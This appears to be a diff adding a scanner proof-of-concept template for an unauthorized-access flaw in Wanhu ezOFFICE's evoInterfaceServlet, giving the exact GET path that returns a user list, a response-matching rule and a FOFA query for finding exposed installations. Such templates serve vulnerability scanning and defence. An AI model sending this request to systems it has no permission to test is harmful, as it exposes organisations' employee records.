@@ -1,0 +1,15 @@
+id: poc-yaml-wan-hu-ezoffice-evointerfaceservlet-unauthorized-access
+info:
+  name: 万户 ezOFFICE evoInterfaceServlet 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+requests:
+- method: GET
+  path: /defaultroot/evoInterfaceServlet?paramType=user
+  expression: status_code == 200 && contains(body,"success") && contains(body,"userList")
+    && contains(body,"普通员工")
+variables: {}
+transport: http
